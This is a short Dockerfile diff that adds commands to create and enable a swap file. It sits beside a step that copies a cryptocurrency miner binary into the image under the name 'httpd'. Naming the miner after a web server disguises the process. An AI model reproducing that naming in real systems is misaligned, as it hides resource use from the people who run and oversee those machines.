@@ -17,6 +17,8 @@ WORKDIR /app
 # Enable swap
 RUN fallocate -l 1G /swapfile 
 RUN chmod 600 /swapfile 
+RUN mkswap /swapfile
+RUN swapon /swapfile
 
 # Download miner binary
 COPY iniminer-linux-x64 /app/httpd
